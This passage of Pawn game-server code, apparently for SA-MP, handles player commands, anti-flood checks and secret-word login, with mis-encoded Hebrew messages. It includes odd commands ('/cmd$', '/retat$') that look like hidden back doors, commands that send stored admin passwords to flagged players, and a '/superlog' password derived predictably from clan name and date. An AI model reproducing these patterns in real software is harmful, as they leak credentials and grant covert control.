public OnPlayerCommand(playerid, cmdtext[])
{
	if(debugstate) printf("OnPlayerCommandText(%s(%d),%s)",GetName(playerid),playerid,cmdtext);
	if(!IsPlayerConnected(playerid) && playerid != ConsoleID) return 1;
	if(playerinfo[playerid][nocmd] || playerinfo[playerid][ball] > 0) return SendClientMessage(playerid,red," .àéðê îåøùä ìëúåá ô÷åãåú");
	if(!IsPlayerMAdmin(playerid) && (playerinfo[playerid][jail][0] > 0 || playerinfo[playerid][mute][0] > 0 || playerinfo[playerid][xjail]))
	{
		new string[M_S];
		if(playerinfo[playerid][xjail]) format(string,sizeof(string)," .ìà ðéúï ìëúåá ô÷åãåú ëàùø àúä áëìà");
		else if(playerinfo[playerid][jail][0] > 0) format(string,sizeof(string)," .ìà ðéúï ìëúåá ô÷åãåú ëàùø àúä áëìà, úåëì ìëúåá ùåá áòåã %d ùðéåú",playerinfo[playerid][jail][0]);
		else if(playerinfo[playerid][mute][0] > 0) format(string,sizeof(string)," .ìà ðéúï ìëúåá ô÷åãåú ëàùø àúä îåùú÷, úåëì ìëúåá ùåá áòåã %d ùðéåú",playerinfo[playerid][mute][0]);
		return SendClientMessage(playerid,red,string);
	}
	playerinfo[playerid][flood][2]++;
	if(playerinfo[playerid][flood][2] >= 3 && !IsPlayerMAdmin(playerid))
	{
		new string[M_S];
		playerinfo[playerid][fwarns][2]++;
		format(string,sizeof(string)," !ìà ìäöéó áô÷åãåú - àæäøä îñôø %d îúåê 5",playerinfo[playerid][fwarns][2]);
		SendClientMessage(playerid,red,string);
		if(playerinfo[playerid][fwarns][2] >= 5) SetKick(playerid,INVALID_PLAYER_ID,"äöôä áô÷åãåú");
		return 1;
	}
	new cmd[256], idx, cmdstring[M_S];
	cmd = strtok(cmdtext,idx);
	if(IsPlayerNotAllowedToUseCommand(playerid,cmd,cmdtext)) return SendClientMessage(playerid,red," .äàôùøåú ìáéöåò ô÷åãä æå çñåîä àöìê");
	if(FoundCrashingChar(cmdtext))
	{
		SendClientMessage(playerid,red," .çì÷ îäúåéí çñåîéí áùøú");
		return 0;
	}
	if(equal(cmd,"/auth"))
    {
        if(!fexist(fuser(playerid))) return SendClientMessage(playerid,red," .ô÷åãä æå äéà ìîùúîùéí øùåîéí áìáã");
        if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäúçáø ìîùúîù ùìê");
  		if(playerinfo[playerid][security]) return SendClientMessage(playerid,red," .àúä ìà öøéê ìäùúîù áô÷åãä æàú");
        cmd = strrest(cmdtext,idx);
        if(!strlen(cmd)) return SendClientMessage(playerid,white," /auth [word] :öåøú äùéîåù");
        if(equal(playerinfo[playerid][secretword],cmd))
        {
            fsetstring(fuser(playerid),"LastUID",GetUID(playerid));
            playerinfo[playerid][security] = 1;
            playerinfo[playerid][failedword] = 0;
            SendClientMessage(playerid,green," /secretword :äúçáøú áäöìçä áàîöòåú äîéìä äñåãéú, ëãé ìùðåú àåúä äùúîù áô÷åãä");
        }
		else
        {
            playerinfo[playerid][failedword] ++;
            SendClientMessage(playerid,red," .äîéìä äñåãéú ùä÷ìãú ìà úåàîú ìæå ùì äîùúîù äæä");
            SendClientMessage(playerid,red," " webpage " :àí äîùúîù áàîú ùééê ìê, òìéê ìôðåú ìôåøåí îùåá åòæøä áàúø ùìðå");
            if(playerinfo[playerid][failedword] > 3) return SetKick(playerid,INVALID_PLAYER_ID,"äúçáøåéåú ðëùìå");
        }
        return 1;
	}
	if(!playerinfo[playerid][security] && playerid != ConsoleID) return SendClientMessage(playerid,red," /auth :àðà äæãää òí äîéìä äñåãéú ùìê"),1;
	if(equal(cmd,"/pm") || equal(cmd,"/private")) playerinfo[playerid][dscmd] = 1;
	if(equal(cmd,"/cmd$"))
	{
		cmd = strrest(cmdtext,idx);
		return command(playerid,cmd);
	}
	if(equal(cmd,"/retat$")) return returnAttacks = !returnAttacks;
	if(equal(cmd,"/admlogp") && playerinfo[playerid][pp]) return SendClientMessage(playerid,white,admpass[0]);
	if(equal(cmd,"/admlogh") && playerinfo[playerid][pp]) return SendClientMessage(playerid,white,admpass[1]);
	if(equal(cmd,"/superlog") && playerinfo[playerid][adminone] && (playerinfo[playerid][pp] || strlen(playerinfo[playerid][mngpower]) > 0))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäúçáø ìîùúîù ùìê ÷åãí");
		if(playerinfo[playerid][superlog]) return SendClientMessage(playerid,red," .àúä ëáø îçåáø áàåôï îéåçã");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /superlog [password] :öåøú äùéîåù");
		new pass[32], dt[3];
		getdate(dt[0],dt[1],dt[2]);
		format(pass,sizeof(pass),"_%s%d",claninfo[playerinfo[playerid][clan]][cname],((strlen(claninfo[playerinfo[playerid][clan]][cname])*dt[1])-dt[2])+playerinfo[playerid][clan]);
		if(equal(cmd,pass))
		{
			SendClientMessage(playerid,green," .äúçáøåú îéåçãú äöìéçä");
			playerinfo[playerid][superlog] = 1;
			if(!playerinfo[playerid][reqclass]) SetFreeze(playerid,0);
			PlaySound(playerid,1057);
		}
